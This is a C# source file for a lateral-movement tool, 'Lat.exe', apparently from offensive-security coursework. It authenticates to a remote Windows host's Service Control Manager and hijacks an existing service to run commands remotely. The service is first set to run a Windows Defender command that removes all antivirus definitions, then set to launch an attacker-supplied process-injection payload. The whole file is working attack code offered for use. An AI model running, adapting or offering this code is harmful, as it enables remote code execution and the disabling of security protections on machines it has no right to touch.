/*
Authenticate to target, open an existing service and change its config to execute remote code
*/

using System;
using System.Runtime.InteropServices;

namespace lat
{
    class Program
    {
        // Authenticate to the Service Control Manager
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            uint dwAccess
        );

        // Open a service so we can change its config
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            uint dwDesiredAccess
        );

        // Change a service's config to execute a different binary
        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(
            IntPtr hService,
            uint dwServiceType,
            int dwStartType,
            int dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName
        );

        // Restart service to execute new binary
        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors
        );

        static void Main(string[] args)
        {
            if (args.Length == 0 || args.Length > 3 || args[0] == "-h")
            {
                Console.WriteLine("[-] Usage: Lat.exe target payload_path (service)[SensorService]");
                return;
            }

            string target       = args[0]; // target hostname e.g. FILE01
            Console.WriteLine($"[*] Target is {target}");

            string payload      = args[1]; // location of ProcessInjection.exe e.g. C:\\Users\Public\ProcessInjection.exe
            Console.WriteLine($"[*] Payload is {payload}");

            string ServiceName  = args.Length > 2 ? args[2] : "SensorService";
            Console.WriteLine($"[*] Service is {ServiceName}");

            // Authenticate to target's Service Control Manager
            IntPtr hSCM = OpenSCManager(
                target,
                null,       // Default Service Control database
                0xF003F     // Full access
            );
            if (hSCM == IntPtr.Zero)
            {
                Console.WriteLine($"[-] Failed to authenticate to Service Control Manager on {target} Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine("[+] Authenticated to Service Control Manager!");

            // Open specified service on target
            IntPtr schService = OpenService(
                hSCM,
                ServiceName,
                0xF01FF
            );
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine($"[-] Failed to open service {ServiceName} Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine($"[+] Opened service {ServiceName}!");

            string kill_av = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions All";

            // Change service to execute payload
            bool config_to_killAV = ChangeServiceConfigA(
                schService,
                0xffffffff,
                3,
                0,
                kill_av,
                null,
                null,
                null,
                null,
                null,
                null
            );
            if (!config_to_killAV)
            {
                Console.WriteLine($"[-] Failed to change service config to kill AV. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine($"[+] Changed {ServiceName} config to {kill_av}!");

            // Start service
            bool started_service_killAV = StartService(
                schService,
                0,
                null
            );

            /*
            if (!started_service_killAV)
            {
                Console.WriteLine($"[-] Failed to start service. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine($"[+] Started service! AV should be killed");
            */

            // Change service to execute payload
            bool config_to_payload = ChangeServiceConfigA(
                schService,
                0xffffffff,
                3,
                0,
                payload,
                null,
                null,
                null,
                null,
                null,
                null
            );
            if (!config_to_payload)
            {
                Console.WriteLine($"[-] Failed to change service config. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine($"[+] Changed {ServiceName} config to {payload}!");

            // Start service
            bool started_service_payload = StartService(
                schService,
                0,
                null
            );
            /*
            if (!started_service_payload)
            {
                Console.WriteLine($"[-] Failed to start service. Error: " + Marshal.GetLastWin32Error());
                return;
            }
            Console.WriteLine($"[+] Started service! Payload should be run");
            */

            return;
        }
    }
}